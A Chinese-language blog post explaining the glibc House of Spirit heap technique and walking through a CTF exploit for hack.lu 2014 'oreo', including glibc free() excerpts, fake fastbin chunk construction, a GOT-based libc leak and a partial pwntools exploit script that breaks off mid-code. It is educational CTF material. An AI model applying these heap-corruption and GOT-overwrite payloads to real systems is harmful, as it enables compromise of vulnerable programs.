<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>how2heap--House_of_Spirit Hack.lu2014--oreo - hhdx's blog</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="hhdx"><meta name=description content="House of Spirit 该攻击手法的主要是思想是，在不可控区域的前后伪造chunk信息，覆盖某指针指向chunk2mem(fake_chunk)，释放该指针后再次申请，对不可控区域的进行改写。
1 2 3 4 5 6 7 8 9 10 11 +---------------+ | 可 控 区 域 | +---------------+ | | | 不 可 控 区 域 | | | | 一 般 为 某 些 | | 指 针 | +---------------+ | 可 控 区 域 | +---------------+ 伪造的chunk也通常是fastbin，因为检查容易绕过。
"><meta name=keywords content="C language,CTF,system software engineer"><meta name=generator content="Hugo 0.116.1 with theme even"><link rel=canonical href=https://hhdx.xyz/post/how2heap-house-of-spirit-hacklu2014-oreo/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link href=/sass/main.min.bda6190ea12800aa36851bdb7b5cb5af46ca988222781d28b20a96aa4c1f6e68.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:title" content="how2heap--House_of_Spirit Hack.lu2014--oreo"><meta property="og:description" content="House of Spirit
该攻击手法的主要是思想是，在不可控区域的前后伪造chunk信息，覆盖某指针指向chunk2mem(fake_chunk)，释放该指针后再次申请，对不可控区域的进行改写。


 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11


+---------------+
|   可 控 区 域   |
+---------------+
|               |
| 不 可 控 区 域  |
|               |
| 一 般 为 某 些  |
|  指 针         |
+---------------+
| 可 控 区 域     |
+---------------+


伪造的chunk也通常是fastbin，因为检查容易绕过。"><meta property="og:type" content="article"><meta property="og:url" content="https://hhdx.xyz/post/how2heap-house-of-spirit-hacklu2014-oreo/"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-07-01T14:13:34+00:00"><meta property="article:modified_time" content="2020-07-01T14:13:34+00:00"><meta itemprop=name content="how2heap--House_of_Spirit Hack.lu2014--oreo"><meta itemprop=description content="House of Spirit
该攻击手法的主要是思想是，在不可控区域的前后伪造chunk信息，覆盖某指针指向chunk2mem(fake_chunk)，释放该指针后再次申请，对不可控区域的进行改写。


 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11


+---------------+
|   可 控 区 域   |
+---------------+
|               |
| 不 可 控 区 域  |
|               |
| 一 般 为 某 些  |
|  指 针         |
+---------------+
| 可 控 区 域     |
+---------------+


伪造的chunk也通常是fastbin，因为检查容易绕过。"><meta itemprop=datePublished content="2020-07-01T14:13:34+00:00"><meta itemprop=dateModified content="2020-07-01T14:13:34+00:00"><meta itemprop=wordCount content="1758"><meta itemprop=keywords content="how2heap,CTF,"><meta name=twitter:card content="summary"><meta name=twitter:title content="how2heap--House_of_Spirit Hack.lu2014--oreo"><meta name=twitter:description content="House of Spirit
该攻击手法的主要是思想是，在不可控区域的前后伪造chunk信息，覆盖某指针指向chunk2mem(fake_chunk)，释放该指针后再次申请，对不可控区域的进行改写。


 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11


+---------------+
|   可 控 区 域   |
+---------------+
|               |
| 不 可 控 区 域  |
|               |
| 一 般 为 某 些  |
|  指 针         |
+---------------+
| 可 控 区 域     |
+---------------+


伪造的chunk也通常是fastbin，因为检查容易绕过。"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>hhdx's blog</a></div><div class=mobile-navbar-icon><span></span>
<span></span>
<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>主页</li></a><a href=/post/><li class=mobile-menu-item>归档</li></a><a href=/tags/><li class=mobile-menu-item>标签</li></a><a href=/links/><li class=mobile-menu-item>链接</li></a><a href=/underway/><li class=mobile-menu-item>施工中</li></a><a href=/about/><li class=mobile-menu-item>关于</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>hhdx's blog</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>主页</a></li><li class=menu-item><a class=menu-item-link href=/post/>归档</a></li><li class=menu-item><a class=menu-item-link href=/tags/>标签</a></li><li class=menu-item><a class=menu-item-link href=/links/>链接</a></li><li class=menu-item><a class=menu-item-link href=/underway/>施工中</a></li><li class=menu-item><a class=menu-item-link href=/about/>关于</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>how2heap--House_of_Spirit Hack.lu2014--oreo</h1><div class=post-meta><span class=post-time>2020-07-01</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>文章目录</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#house-of-spirit>House of Spirit</a></li><li><a href=#hacklu2014-oreo>hack.lu2014 oreo</a><ul><li><a href=#分析>分析</a></li><li><a href=#leak-libc>leak libc</a></li><li><a href=#house-of-spirit-1>house of spirit</a></li></ul></li><li><a href=#存在的疑问>存在的疑问&mldr;</a></li><li><a href=#ref>ref</a></li></ul></li></ul></nav></div></div><div class=post-content><h2 id=house-of-spirit>House of Spirit</h2><p>该攻击手法的主要是思想是，在不可控区域的前后伪造chunk信息，覆盖某指针指向<code>chunk2mem(fake_chunk)</code>，释放该指针后再次申请，对不可控区域的进行改写。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>+---------------+
</span></span><span class=line><span class=cl>|   可 控 区 域   |
</span></span><span class=line><span class=cl>+---------------+
</span></span><span class=line><span class=cl>|               |
</span></span><span class=line><span class=cl>| 不 可 控 区 域  |
</span></span><span class=line><span class=cl>|               |
</span></span><span class=line><span class=cl>| 一 般 为 某 些  |
</span></span><span class=line><span class=cl>|  指 针         |
</span></span><span class=line><span class=cl>+---------------+
</span></span><span class=line><span class=cl>| 可 控 区 域     |
</span></span><span class=line><span class=cl>+---------------+
</span></span></code></pre></td></tr></table></div></div><p>伪造的chunk也通常是fastbin，因为检查容易绕过。</p><p><code>__libc_free</code>函数中对<code>IS_MMAPED</code>检查。如果mmap分配，将会使用<code>munmap_chunk</code>进行释放。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// glibc release/2.25/master 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>__libc_free</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>mem</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>.....</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=nf>mem2chunk</span> <span class=p>(</span><span class=n>mem</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>chunk_is_mmapped</span> <span class=p>(</span><span class=n>p</span><span class=p>))</span>                       <span class=cm>/* release mmapped memory. */</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=cm>/* See if the dynamic brk/mmap threshold needs adjusting.
</span></span></span><span class=line><span class=cl><span class=cm>	 Dumped fake mmapped chunks do not affect the threshold.  */</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>mp_</span><span class=p>.</span><span class=n>no_dyn_threshold</span>
</span></span><span class=line><span class=cl>            <span class=o>&amp;&amp;</span> <span class=nf>chunksize_nomask</span> <span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>mp_</span><span class=p>.</span><span class=n>mmap_threshold</span>
</span></span><span class=line><span class=cl>            <span class=o>&amp;&amp;</span> <span class=nf>chunksize_nomask</span> <span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=n>DEFAULT_MMAP_THRESHOLD_MAX</span>
</span></span><span class=line><span class=cl>	        <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nf>DUMPED_MAIN_ARENA_CHUNK</span> <span class=p>(</span><span class=n>p</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>mp_</span><span class=p>.</span><span class=n>mmap_threshold</span> <span class=o>=</span> <span class=nf>chunksize</span> <span class=p>(</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>mp_</span><span class=p>.</span><span class=n>trim_threshold</span> <span class=o>=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>mp_</span><span class=p>.</span><span class=n>mmap_threshold</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nf>LIBC_PROBE</span> <span class=p>(</span><span class=n>memory_mallopt_free_dyn_thresholds</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                        <span class=n>mp_</span><span class=p>.</span><span class=n>mmap_threshold</span><span class=p>,</span> <span class=n>mp_</span><span class=p>.</span><span class=n>trim_threshold</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>munmap_chunk</span> <span class=p>(</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ar_ptr</span> <span class=o>=</span> <span class=nf>arena_for_chunk</span> <span class=p>(</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>_int_free</span> <span class=p>(</span><span class=n>ar_ptr</span><span class=p>,</span> <span class=n>p</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nf>libc_hidden_def</span> <span class=p>(</span><span class=n>__libc_free</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><code>_int_free</code>函数中对nextchunk的大小进行检查。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// glibc release/2.25/master 3909~3923
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span> <span class=p>(</span><span class=nf>chunksize_nomask</span> <span class=p>(</span><span class=nf>chunk_at_offset</span> <span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>			  <span class=o>&lt;=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=o>||</span> <span class=nf>__builtin_expect</span> <span class=p>(</span><span class=nf>chunksize</span> <span class=p>(</span><span class=nf>chunk_at_offset</span> <span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>size</span><span class=p>))</span>  
</span></span><span class=line><span class=cl>			     <span class=o>&gt;=</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=cm>/* We might not have a lock at this point and concurrent modifications
</span></span></span><span class=line><span class=cl><span class=cm>	   of system_mem might have let to a false positive.  Redo the test
</span></span></span><span class=line><span class=cl><span class=cm>	   after getting the lock.  */</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>have_lock</span>
</span></span><span class=line><span class=cl>	    <span class=o>||</span> <span class=p>({</span> <span class=nf>assert</span> <span class=p>(</span><span class=n>locked</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		  <span class=nf>__libc_lock_lock</span> <span class=p>(</span><span class=n>av</span><span class=o>-&gt;</span><span class=n>mutex</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		  <span class=n>locked</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>					  <span class=c1>// 对nextchunk大小进行检查
</span></span></span><span class=line><span class=cl><span class=c1></span>		  <span class=nf>chunksize_nomask</span> <span class=p>(</span><span class=nf>chunk_at_offset</span> <span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>size</span><span class=p>))</span> <span class=o>&lt;=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span>
</span></span><span class=line><span class=cl>		    <span class=o>||</span> <span class=nf>chunksize</span> <span class=p>(</span><span class=nf>chunk_at_offset</span> <span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>size</span><span class=p>))</span> <span class=o>&gt;=</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	      <span class=p>}))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=hacklu2014-oreo>hack.lu2014 oreo</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Arch:     i386-32-little
</span></span><span class=line><span class=cl>RELRO:    No RELRO
</span></span><span class=line><span class=cl>Stack:    Canary found
</span></span><span class=line><span class=cl>NX:       NX enabled
</span></span><span class=line><span class=cl>PIE:      No PIE (0x8048000)
</span></span></code></pre></td></tr></table></div></div><p>题目比较古老了，防护开的不多。</p><h3 id=分析>分析</h3><p>程序功能</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1. Add new rifle
</span></span><span class=line><span class=cl>2. Show added rifles
</span></span><span class=line><span class=cl>3. Order selected rifles
</span></span><span class=line><span class=cl>4. Leave a Message with your Order
</span></span><span class=line><span class=cl>5. Show current stats
</span></span><span class=line><span class=cl>6. Exit!
</span></span></code></pre></td></tr></table></div></div><p>Add new rifle 函数，固定分配0x38个字节，加上chunk头，也就是<strong>0x40的fast chunk size</strong>。在末尾四个字节处存储前一个rifle首地址。输入name和description，其中可以明显的看到溢出和覆盖。头指针和计数变量全局存储。</p><p>Show added rifles函数，对所有的rifle进行遍历，输出name和description。</p><p>Order selected rifles函数，订购rifles，遍历free 0x38字节的rifle结构。订单数也是一个全局变量。</p><p>Leave message函数，在全局存储128字节的信息。</p><p>所用到的全局变量的结构如下：</p><p><img src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200701192427785.png alt=image-20200701192427785></p><p>rifle变量是rifle结构的头指针，order_num是订单数计数变量，num是rifle计数变量，message_ptr在main函数中初始化为&amp;message，指向下方128字节message空间的起始地址。</p><h3 id=leak-libc>leak libc</h3><p>通过对rifle的next指针覆盖成puts_got的地址，然后show added rifle就可以打印出puts的地址。</p><p>恰好puts_got+0x34的位置就是NULL，不会造成程序出错。</p><h3 id=house-of-spirit-1>house of spirit</h3><p>message_ptr是一个理想的控制对象，只要控制了它存储的地址，就可以通过leave message进行改写。</p><p>查看附近，对齐地址就有0x804a2a0。不断进行add rifle就可以控制num，也就是<code>fakechunk->size</code>，后面message区域也可以进行nextchunk的构造。</p><p>添加0x40个rifle控制<code>fakechunk->size</code>为0x40。注意message前方align 20，所以message区域添加0x20的padding就完成了fakechunk的构造。接着构造nextchunk的pre_size和size，只要注意将size控制在<code>2 * SIZE_SZ</code>和<code>av->system_mem</code>中间的值即可。</p><p>在rifle中覆盖next指针为0x804a2a8，然后order rifle，fastbin的0x40链表头就有了我们伪造的chunk。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>*</span><span class=mh>0x20</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leave_message</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>27</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=mh>0x804A2A8</span><span class=p>),</span> <span class=s2>&#34;B&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>order</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>接下来，利用message_ptr对strlen_got进行改写即可。</p><p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/hacklu2014-oreo/exp.py>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&#34;i386&#34;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>localfile</span> <span class=o>=</span> <span class=s2>&#34;./oreo&#34;</span>
</span></span><span class=line><span class=cl><span class=n>locallibc</span> <span class=o>=</span> <span class=s2>&#34;/lib/i386-linux-gnu/libc.so.6&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>desc</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># io.recvuntil(&#34;: &#34;)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1># io.recvuntil(&#34;name: &#34;)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># io.recvuntil(&#34;description: &#34;)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>desc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>order</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>3</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1># io.sendlineafter(&#34;Action: &#34;, str(3))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>leave_message</span><span class=p>(</span><span class=n>msg</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1># io.sendlineafter(&#34;Action: &#34;, str(4))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># io.sendlineafter(&#34;your order: &#34;, msg)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;6. Exit!</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># leak libc</span>
</span></span><span class=line><span class=cl>    <span class=n>puts_got</span> <span class=o>=</span> <span class=mh>0x804A248</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>27</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>puts_got</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=s2>&#34;b *0x8048A25&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Description: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Description: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>puts_addr</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>puts_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;puts&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s2>&#34;libc base: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>libc_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># constructe fake chunk</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x3e</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=s2>&#34;A&#34;</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>27</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=mh>0x804A2A8</span><span class=p>),</span> <span class=s2>&#34;B&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>*</span><span class=mh>0x20</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>leave_message</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>order</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># attack</span>
</span></span><span class=line><span class=cl>    <span class=n>strlen_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;strlen&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=s2>&#34;A&#34;</span><span class=p>,</span> <span class=n>p32</span><span class=p>(</span><span class=n>strlen_got</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b *0x8048A25&#34;)</span>
